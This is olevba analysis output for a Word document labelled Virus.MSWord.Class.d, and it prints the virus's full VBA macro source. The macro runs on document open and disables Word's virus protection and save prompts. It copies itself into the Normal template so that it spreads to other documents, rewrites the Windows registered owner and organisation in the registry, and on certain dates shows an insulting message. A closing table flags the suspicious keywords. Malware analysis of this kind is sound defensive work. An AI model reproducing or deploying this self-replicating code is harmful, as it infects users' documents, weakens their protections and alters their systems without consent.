olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-2a075f1f196b06090eb49b4e8d37f7233b76cbec
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-2a075f1f196b06090eb49b4e8d37f7233b76cbec - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'MINERALS & MINING3/12/99 2:30:43 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'MINERALS & MINING3/12/99 2:30:43 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'MINERALS & MINING3/12/99 2:30:43 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
Const REG_SZ As Long = 1
'MINERALS & MINING3/12/99 2:30:43 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
Const HKEY_CURRENT_USER As Long = &H80000001
'MINERALS & MINING3/12/99 2:30:43 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'MINERALS & MINING3/12/99 2:30:43 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
Sub AutoOpen()
'MINERALS & MINING3/12/99 2:30:43 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
On Error GoTo out
'MINERALS & MINING3/12/99 2:30:43 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
Options.VirusProtection = False
'MINERALS & MINING3/12/99 2:30:43 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
Options.SaveNormalPrompt = False
'MINERALS & MINING3/12/99 2:30:43 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
Options.ConfirmConversions = False
'MINERALS & MINING3/12/99 2:30:43 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'MINERALS & MINING3/12/99 2:30:43 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
If nt > 70 And ad > 0 Then GoTo out
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
If nt < 70 Then
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
End If
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
host.codemodule.AddFromFile ("c:\class.sys")
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
With host.codemodule
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
    For x = 1 To 16
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
    .deletelines 1
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
    Next x
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
End With
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
If nt < 70 Then
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
    With host.codemodule
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
    .replaceline 1, "Sub AutoClose()"
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
    .replaceline 91, "Sub ToolsMacro()"
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
    For x = 70 To 81
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
        .deletelines 62
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
    Next x
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
    .replaceline 35, "    For x = 1 To 4"
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
    End With
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
End If
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
If nt < 70 Then
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
u = RegCloseKey(k)
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
End If
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
With host.codemodule
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
    For x = 2 To 104 Step 2
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
    Next x
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
End With
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
out:
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
End Sub
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
Sub ViewVBCode()
'MINERALS & MINING3/12/99 2:30:44 PMHP LaserJet 4 Plus on LPT1:LTRHDR.DOC
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
